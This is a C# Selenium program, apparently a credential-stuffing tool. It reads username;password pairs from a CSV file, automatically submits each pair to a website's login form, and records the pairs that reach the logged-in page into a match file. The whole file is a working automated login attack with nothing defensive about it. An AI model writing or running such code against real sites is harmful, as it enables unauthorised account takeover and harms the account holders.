using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace SeleniumTest
{
    class Program
    {
        static void Main(string[] args)
        {
            //Config
            string dictName = "dict.csv"; //Simple csv file: id;pw
            string matchDictName = "matchDict.csv";
            string websiteUrl = "https://someWebSite.com/";
            string loginUrl = websiteUrl + "login.php";
            string successUrl = websiteUrl + "user.php";
            string logoutUrl = websiteUrl + "logout.php";
            string loginXPath = "//*[@id='middle_part']/center/table/tbody/tr[1]/td[2]/input";
            string passwordXPath = "//*[@id='middle_part']/center/table/tbody/tr[2]/td[2]/input";
            string submitXPath = "//*[@id='middle_part']/center/table/tbody/tr[3]/td[1]/input";

            List<string[]> dict = new List<string[]>();
            List<string[]> matchDict = new List<string[]>();

            if (File.Exists(dictName))
            {
                using (StreamReader reader = new StreamReader(dictName))
                {
                    while (!reader.EndOfStream)
                    {
                        var values = reader.ReadLine().Split(';');
                        dict.Add(new string[] { values[0], values[1] });
                    }
                };

                ChromeDriver driver = new ChromeDriver();
                WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                driver.Manage().Window.Maximize();
                driver.Navigate().GoToUrl(loginUrl);
                Console.Clear();

                for (int i = 0; i < dict.Count; i++)
                {
                    string id = dict[i][0];
                    string pw = dict[i][1];
                    IWebElement login = wait.Until(e => e.FindElement(By.XPath(loginXPath)));
                    IWebElement password = wait.Until(e => e.FindElement(By.XPath(passwordXPath)));
                    IWebElement submit = wait.Until(e => e.FindElement(By.XPath(submitXPath)));
                    login.SendKeys(id);
                    password.SendKeys(pw);
                    submit.Click();
                    if (driver.Url == successUrl)
                    {
                        driver.Navigate().GoToUrl(logoutUrl);
                        driver.Navigate().GoToUrl(loginUrl);
                        matchDict.Add(new string[] { id, pw });
                    }
                    double percent = Math.Round((double)(i + 1) / dict.Count * 100, 2);
                    Console.WriteLine($"{i + 1}/{dict.Count} {percent:0.00}%... Match: {matchDict.Count}");
                    if (i != dict.Count - 1)
                    {
                        Console.SetCursorPosition(0, Console.CursorTop - 1);
                    }
                }

                driver.Dispose();

                if (matchDict.Any())
                {
                    using (StreamWriter writer = new StreamWriter(matchDictName))
                    {
                        foreach (var item in matchDict)
                        {
                            writer.WriteLine(item[0] + ";" + item[1]);
                        }
                        Console.WriteLine($"{matchDictName} saved, {matchDict.Count} records match!");
                    }
                }
                else
                {
                    Console.WriteLine("There was no match!");
                }
            }
            else
            {
                Console.WriteLine($"{dictName} not found!");            
            }

            Console.ReadKey(true);
        }
    }
}
